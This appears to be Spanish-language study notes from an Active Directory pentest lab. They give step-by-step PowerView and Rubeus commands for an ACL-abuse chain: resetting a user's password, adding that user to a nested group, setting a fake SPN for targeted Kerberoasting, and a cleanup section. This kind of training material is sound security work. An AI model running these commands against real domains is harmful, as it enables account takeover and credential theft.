
## Abuso de las ACL

Para recapitular dónde estamos y a dónde queremos llegar

- Tenemos control sobre `wley` cuyo hash recuperamos en el Responder y pudimos crackear
- Descubrimos que puede usar un ataque de ACLs para obtener control sobre `adunn`
- Adunn vimos que puede realizar un DCSync lo que nos daria control de todo el dominio al permitirnos recuperar los hashes de todos los usuarios y escalar privs a Domain/Enterprise Admin e incluso obtener persistencia

Para llevar a cabo la cadena:

- Usamos el usuario wley para cambiar la pass del usuario damundsen
- Nos autenticamos como damundsen y aprovechamos sus derechos de GenericWrite para añadir un usuario que controlamos a Help Desk Level 1
- Aprovechamos que es un grupo anidado a Information Technology y usamos el derecho GenericAll para tomar control de adunn


1. Abrimos una consola y nos autenticamos como `wley` 

```
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
![[Pasted image 20260928153009.png]]

2. Creamos un objeto SecureString que sera la contraseña de `damundsen`

```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
![[Pasted image 20260928153043.png]]

3. Usaremos la funcion de PoweeView (Set-DomainUserPassword) para cambiar la pass del usuario `damundsen`. `-Credential` sera la variable de la cred de wley

- Podríamos hacer esto desde un host de ataque Linux usando una herramienta como `pth-net`, que es parte del [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

```
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
![[Pasted image 20260928153224.png]]

4. Hacemos un proceso similar para autenticarnos como damundsen y agregarnos a Help Desk Level 1

- Nos autenticamos como damundsen
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```
![[Pasted image 20260928153327.png]]

- Una vez autenticados nos agregamos con [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/). Primero confirmamos que el usuario no es miembro del grupo objetivo

	Esto también podría hacerse desde un host Linux usando el `pth-toolkit`

```
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```
![[Pasted image 20260928153441.png]]

```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
![[Pasted image 20260928153500.png]]

- Confirmamos que hemos sido añadidos al grupo

```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
![[Pasted image 20260928153534.png]]

5. Ahora con la nueva membresia y los derechos heredados `GenericAll` deberiamos ser capaces de tomar control de adunn. En este caso le añadiremos un atributo SPN para hacer un Kerberoasting ya que no se puede interrumpir el funcionamiento por orden de la compañia

- Creamos SPN falso con [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) o [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) (desde un Linux)

```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
![[Pasted image 20260928153817.png]]

6. Realizamos un Kerberoast con Rubeus

```
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
![[Pasted image 20260928153853.png]]

	Ahora podemos crackearlo offline


## Limpieza

1. Eliminar el SPN falso que creamos en el usuario `adunn`.

```
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
![[Pasted image 20260928153953.png]]

2. Eliminar al usuario `damundsen` del grupo `Help Desk Level 1`

```
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
![[Pasted image 20260928154008.png]]

- Confirmando que fue eliminado del grupo

```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```


3. Restablecer la contraseña del usuario `damundsen` a su valor original (si lo conocemos) o hacer que nuestro cliente la establezca/alerte al usuario

```
no la conocemos
```
